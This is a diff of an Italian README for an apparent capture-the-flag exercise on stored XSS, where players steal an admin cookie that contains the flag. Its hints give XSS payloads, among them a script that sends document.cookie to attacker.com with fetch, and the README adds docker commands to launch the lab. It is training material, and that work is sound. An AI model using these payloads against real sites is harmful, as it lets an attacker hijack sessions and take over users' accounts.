@@ -9,14 +9,20 @@ Sarà possibile eseguire codice malevolo nel browser dell'admin e ottenere il su
 
 ## Obiettivo
 - **Sfrutta la vulnerabilità Stored XSS** inserendo uno script malevolo nel nome, descrizione o immagine di un prodotto.
-- **Attendi che l’admin visiti la pagina**, eseguendo il codice iniettato.
-- **Recupera il cookie dell’admin** che contiene la flag `flag{you_changed_my_website??}`.
+- **Attendi che l'admin visiti la pagina**, eseguendo il codice iniettato.
+- **Recupera il cookie dell'admin** che contiene la flag `flag{you_changed_my_website??}`.
 
 ## Suggerimenti
 - Il form di creazione dei prodotti accetta input arbitrari e li visualizza nella pagina senza sanitizzazione.
 - Prova a inserire un payload come `<script>alert('XSS!')</script>` nel nome o nella descrizione di un prodotto.
-- Puoi anche provare a rubare il cookie dell’admin inviandolo a un tuo server con `<script>fetch('https://attacker.com/log?cookie='+encodeURIComponent(document.cookie))</script>`.
+- Puoi anche provare a rubare il cookie dell'admin inviandolo a un tuo server con `<script>fetch('https://attacker.com/log?cookie='+encodeURIComponent(document.cookie))</script>`.
 - Ci sono dei siti come [Beeceptor](https://beeceptor.com/) che ti permettono di creare un server fittizio per ricevere i dati inviati con `fetch`.
-- È possibile iniettare codice JavaScript anche nell’URL di un’immagine, ad esempio `<img src=x onerror="alert('XSS!')">`.
+- È possibile iniettare codice JavaScript anche nell'URL di un'immagine, ad esempio `<img src=x onerror="alert('XSS!')">`.
+
+## Avviare il server:
+```bash
+docker pull ghcr.io/ax3lt/xss-ch2
+docker run -p 80:80 ghcr.io/ax3lt/xss-ch2
+```
 
 Buona fortuna! 🚀🔓
